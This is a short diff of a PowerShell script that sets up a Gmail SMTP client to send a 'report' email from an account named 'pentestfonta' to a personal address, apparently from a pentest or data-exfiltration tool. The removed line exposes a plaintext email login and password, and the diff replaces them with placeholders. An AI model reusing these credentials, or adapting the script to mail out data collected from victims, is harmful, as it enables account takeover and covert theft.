@@ -1,7 +1,7 @@
 $SMTPServer = 'smtp.gmail.com'
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 $SMTPInfo.EnableSsl = $true
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('pentestfonta@outlook.com', 'M@atheus1998');
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('email', 'senha');
 $ReportEmail = New-Object System.Net.Mail.MailMessage
 $ReportEmail.From = 'pentestfonta@outlook.com'
 $ReportEmail.To.Add('matheusfontanettimartins@gmail.com')
